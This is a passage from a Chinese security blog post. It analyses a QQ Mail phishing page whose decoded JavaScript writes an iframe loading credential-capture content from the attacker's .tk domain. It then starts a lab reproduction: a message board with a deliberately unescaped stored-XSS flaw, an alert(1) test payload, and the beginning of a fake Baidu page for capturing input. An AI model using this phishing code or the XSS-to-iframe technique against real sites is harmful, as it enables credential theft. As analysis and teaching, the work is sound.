class="hljs-comment">&lt;!--&lt;![endif]--&gt;</span></span></span><br><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mainJSBg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span></span></span><br>.lay_background&#123;background-repeat:no-repeat;background-position:center top;background-attachment:scroll;background-image:url(64538_top.jpg);&#125;<br><span class="handlebars"><span class="xml">body&#123;background-image:url(64538_bg.jpg); background-repeat:repeat;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span></span><br><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dynamicStyle&quot;</span>&gt;</span></span></span><br>.ownermode&#123;display:none;&#125;<br>.clientmode&#123;display:;&#125;<br>.editmode&#123;display:none;&#125;<br>.customoff&#123;display:;&#125;<br>.alphamode&#123;display:none;&#125;<br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span></span><br><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;Shortcut Icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span></span><br><span class="javascript">&lt;body id=<span class="hljs-string">&quot;QZ_Body&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;bg_body  &quot;</span>&gt;</span><br><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;welcomeflash&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:fixed;_position:absolute;top:0;left:0;background-color:white;text-align:center;width:100%;z-index:30000;height:10000px;&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&quot;wSwf_obj_swf.call(this)&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:100%;position:absolute;left:0;top:0;background:white;height:100%;&quot;</span>&gt;</span></span></span><br><br>&lt;链接中?????&gt;<br><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:100%;cursor:pointer;position:absolute;left:0px;background:url(about:blank);opacity:0;z-index:30001;top:0px;height:100%&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span></span></span><br><span class="javascript">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">var</span> wel=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;welcomeflash&#x27;</span>),timer,ch,_s=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>;</span><br><span class="javascript"><span class="hljs-built_in">window</span>.wSwf_obj_swf = <span class="hljs-built_in">window</span>.wSwf_obj_swf_s=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript"><span class="hljs-built_in">document</span>.documentElement.style.overflow = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="javascript">wel &amp;&amp; (wel.innerHTML = <span class="hljs-string">&#x27;&#x27;</span>);</span><br><span class="javascript">wel &amp;&amp; <span class="hljs-built_in">document</span>.body.removeChild(wel);</span><br><span class="javascript"><span class="hljs-built_in">window</span>.removeEventListener?<span class="hljs-built_in">window</span>.removeEventListener(<span class="hljs-string">&#x27;resize&#x27;</span>,_s):(<span class="hljs-built_in">window</span>.detachEvent&amp;&amp;<span class="hljs-built_in">window</span>.detachEvent(<span class="hljs-string">&#x27;onresize&#x27;</span>,_s));</span><br><span class="javascript"><span class="hljs-built_in">clearTimeout</span>(timer);</span><br>&#125;;<br><span class="javascript">timer = <span class="hljs-built_in">setTimeout</span>(wSwf_obj_swf, <span class="hljs-number">4000</span>);</span><br>if (wel) &#123;<br><span class="javascript">_s=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">ch=<span class="hljs-built_in">document</span>.documentElement.clientHeight;</span><br><span class="javascript">wel.children[<span class="hljs-number">0</span>].style.paddingTop = <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.max(<span class="hljs-number">0</span>,ch - <span class="hljs-number">590</span>) / <span class="hljs-number">2</span>) <span class="hljs-string">&#x27;px&#x27;</span>;</span><br>&#125;;<br><br><span class="javascript"><span class="hljs-built_in">document</span>.documentElement.style.overflow = <span class="hljs-string">&quot;hidden&quot;</span>;</span><br>_s();<br><span class="javascript"><span class="hljs-built_in">window</span>.addEventListener?<span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;resize&#x27;</span>,_s,<span class="hljs-literal">false</span>):(<span class="hljs-built_in">window</span>.attachEvent&amp;&amp;<span class="hljs-built_in">window</span>.attachEvent(<span class="hljs-string">&#x27;onresize&#x27;</span>,_s));</span><br>&#125;<br>&#125;)();<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">html</span>&#123;<span class="hljs-attribute">overflow</span>:hidden;&#125;<span class="hljs-selector-tag">body</span>&#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>;<span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">scroll</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;iframe&quot;</span>   <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span>  <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>   <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span>   <br><span class="javascript">               <span class="hljs-keyword">var</span> pos,str,para,url;  </span><br><span class="javascript">                str = <span class="hljs-built_in">window</span>.location.href;  </span><br><span class="javascript">                pos = str.indexOf(<span class="hljs-string">&quot;?&quot;</span>)  ;</span><br>                url = str.substring(pos 1);  <br>                if (pos&gt;0)&#123;  <br><span class="javascript">n=<span class="hljs-string">&#x27;http://ujhgdgjalkfja2.tk/&#x27;</span>;</span><br>j1=n url;<br><span class="handlebars"><span class="xml">c=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://s.tbcdn.cn/apps/login/static/img/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span>&#x27;;</span></span><br><span class="handlebars"><span class="xml">b=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">html</span>&#123;<span class="hljs-attribute">overflow</span>:hidden;&#125;<span class="hljs-selector-tag">body</span>&#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>;<span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">scroll</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>&#x27;;</span></span><br><span class="handlebars"><span class="xml">a=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;main&quot;</span>  <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#x27;;</span></span></span></span><br><span class="javascript">k1=<span class="hljs-string">&#x27;&quot; width=&quot;101%&quot;  frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;&#x27;</span>;</span><br><span class="javascript"> <span class="hljs-keyword">var</span>  d =  <span class="hljs-built_in">window</span>.frames[<span class="hljs-number">0</span>];</span><br>  d.document.write(c b a j1 k1);   <br>                &#125;  <br><span class="javascript">                <span class="hljs-keyword">else</span>  </span><br>                &#123;  <br>                &#125;  <br>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>&quot;));<br>//--&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&quot;));<br>//--&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们解码出完整代码就可以看到，他使用javascript的document.write方法，动态写入html页面覆盖整个文档，因为这么大量的js动态写入会非常慢，所以他在页面没有加载完之前，使用了“加载中”来掩盖这个网站原有的内容。</p><p>他前面大部分代码应该是从别人钓鱼qq空间用的代码中提取出来的，所以那部分css和js有很多不合理的地方，而且整个页面背景与登陆框都是调用他自己服务器保存好的截图，不是用html和css写出来的，导致不能完整的模仿出qq邮箱的一些样式，欺骗性大大降低。</p><p>最后的部分也就是他真正用来盗取账号密码的部分，攻击者远程调用了一个iframe框架,使用js依次将写好的变量c b a j1 k1的内容动态写入当前页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;iframe&quot;</span>   <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span>  <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>   <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span>   <br><span class="javascript">               <span class="hljs-keyword">var</span> pos,str,para,url;  </span><br><span class="javascript">                str = <span class="hljs-built_in">window</span>.location.href;  </span><br><span class="javascript">                pos = str.indexOf(<span class="hljs-string">&quot;?&quot;</span>)  ;</span><br>                url = str.substring(pos 1);  <br>                if (pos&gt;0)&#123;  <br><span class="javascript">n=<span class="hljs-string">&#x27;http://ujhgdgjalkfja2.tk/&#x27;</span>;</span><br>j1=n url;<br><span class="handlebars"><span class="xml">c=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://s.tbcdn.cn/apps/login/static/img/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span>&#x27;;</span></span><br><span class="handlebars"><span class="xml">b=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">html</span>&#123;<span class="hljs-attribute">overflow</span>:hidden;&#125;<span class="hljs-selector-tag">body</span>&#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>;<span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">scroll</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>&#x27;;</span></span><br><span class="handlebars"><span class="xml">a=&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;main&quot;</span>  <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#x27;;</span></span></span></span><br><span class="javascript">k1=<span class="hljs-string">&#x27;&quot; width=&quot;101%&quot;  frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;&#x27;</span>;</span><br><span class="javascript"> <span class="hljs-keyword">var</span>  d =  <span class="hljs-built_in">window</span>.frames[<span class="hljs-number">0</span>];</span><br>  d.document.write(c b a j1 k1);   <br>                &#125;  <br><span class="javascript">                <span class="hljs-keyword">else</span>  </span><br>                &#123;  <br>                &#125;  <br>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中</p><ul><li>str=window.location.href是获取当前url赋值给str</li><li>pos=str.indexOf(“?”)是寻找str字符串也就是当前url中第一次出现?的位置并且返回给pos</li><li>url=str.substring(pos 1)是将pos到结束的字符串返回给url，后面的1小于pos的话，就是将从第一位到?的字符串返回给url</li></ul><p>前面我们已经知道windows.location.href是<a href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a></p><p>那么这里url就是xmk/youx1?id=qyshz107&amp;/OdJb</p><p>然后整个页面的结果就是：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;shortcut icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://s.tbcdn.cn/apps/login/static/img/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">html</span>&#123;<span class="hljs-attribute">overflow</span>:hidden;&#125;<span class="hljs-selector-tag">body</span>&#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>;<span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;&#125;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">scroll</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;main&quot;</span>  <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;101%&quot;</span>  <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><p>典型的iframe框架钓鱼，这个时候我们如果在登陆框输入东西，实际上是在对方服务器的一个页面 <a href="http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb">http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb</a> 内输入东西，如果不确定的话我们可以直接访问这个链接看一眼，发现的确是一个制作好的邮箱页面。那么已经到了对方服务器上面的，你的输入对方想怎么记录怎么保存都可以。如果之前输入了账号密码，此时已经在服务器上保存了，对方的目的其实已经达到。</p><p>但是进一步抓包测试，发现对方在这里接收了账号密码并保存之后，还会传输数据到真正的qq邮箱地址去登陆，然后返回是否成功登陆的信息，如果失败就返回账号密码错误信息。如果成功登陆，就会控制windows.location.href跳转到真正的qq邮箱mail.qq.com，这样减轻用户的嫌疑。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing05.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing06.png"></p><p>至此，对方的整个钓鱼过程就完成了，如果他的细节处理好一点，对一些萌新就能瞒天过海了。</p><p>这个ujhgdgjalkfja2.tk就是对方的域名了，.tk后缀可能大家不常见，但是实际上这是一个注册量非常庞大的顶级域名。</p><p>百科中是这样说的：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing07.png"></p><p>.TK的域名是南太平洋一个仅有1,268人的岛国托克劳（历史上亦称联合群岛或托克劳群岛）的国家顶级域名。它是任何人都可以申请的免费的顶级域名之一。(ccTLD).TK已拥有活跃域名2500万个，成为了世界第一大ccTLD。</p><p>既然是免费的国外域名，那么.tk域名一定是很多不法分子所钟爱的。这个域名通过域名反查和ip地址也基本得不到太多有用的信息。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing08.png"></p><h2 id="0x03-复现-环境搭建"><a href="#0x03-复现-环境搭建" class="headerlink" title="0x03 复现-环境搭建"></a>0x03 复现-环境搭建</h2><p>之前在 <a href="http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a> 中提到了钓鱼的几种方式，其中iframe框架钓鱼只描述了一下原理并且用了一个小例子，那么就在这里补充下存储型xss怎么调用iframe钓鱼。</p><p>既然要复现整个钓鱼过程，我们就要用到一个存在存储型xss漏洞的页面、一个伪造的html页面、一个接收伪造页面传输的数据的php文件、一个保存数据的txt文件。</p><h4 id="留言系统搭建"><a href="#留言系统搭建" class="headerlink" title="留言系统搭建"></a>留言系统搭建</h4><p>首先搭建存在存储型xss漏洞的页面，我们在这里搭建一个简易的留言系统进行测试，一共需要用到message.php和save.php两个页面。</p><p>其中message.php负责输入留言和展示留言，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>留言系统<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:500px;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:left;&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;save.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>昵&amp;nbsp&amp;nbsp称：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>留&amp;nbsp&amp;nbsp言：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>&lt;?php<br>$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;test&quot;);<br>if(!$con)&#123;<br> die(&quot;database connect error!&quot;);<br>&#125;<br><br>$result=mysqli_query($con,&quot;select `name`, `message` from mess;&quot;);<br><br>while($row = $result-&gt;fetch_assoc()) &#123;<br>        echo &quot;<span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>Name: &quot; . urldecode($row[&quot;name&quot;]). &quot;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>  Message: &quot; . urldecode($row[&quot;message&quot;]). &quot;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>&quot;;<br>&#125; <br><br><br>?&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>save.php负责将接收到的昵称和留言上传到数据库，并跳转回message.php这里数据库内只要新建名为mess的表，存在name和message两个字段即可实现这个功能。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;?php<br><br>$name = urlencode($_REQUEST[&#x27;name&#x27;]);<br>$message = urlencode($_REQUEST[&#x27;message&#x27;]);<br>echo &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>&#x27;;<br><br>$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;test&quot;);<br>if(!$con)&#123;<br> die(&quot;database connect error!&quot;);<br>&#125;<br><br><br><br>if($name&amp;&amp;$message)<br>&#123;<br><br>mysqli_query($con,&quot;INSERT INTO `mess` (`name`, `message`) VALUES (&#x27;&quot;.$name.&quot;&#x27;, &#x27;&quot;.$message.&quot;&#x27;);&quot;);<br>&#125;<br><br>echo &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span>&#x27;;<br><span class="javascript">echo <span class="hljs-string">&quot;location.href=&#x27;./message.php&#x27;&quot;</span>;</span><br>echo &#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;;<br><br><br>?&gt;<br><br></code></pre></td></tr></table></figure><p>然后我们发现输入正常留言可以显示出来：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing09.png"></p><p>构造一个xss代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也可以正常运行，证明存在存储型xss：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing10.png"></p><h4 id="服务器接收页面"><a href="#服务器接收页面" class="headerlink" title="服务器接收页面"></a>服务器接收页面</h4><p>我们的服务器上，要有一个可供调用的伪造html页面，一个接收数据的php文件，一个储存数据的txt文件。</p><p>这里我伪造一个百度的主页进行测试，来捕获这个人搜索的信息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 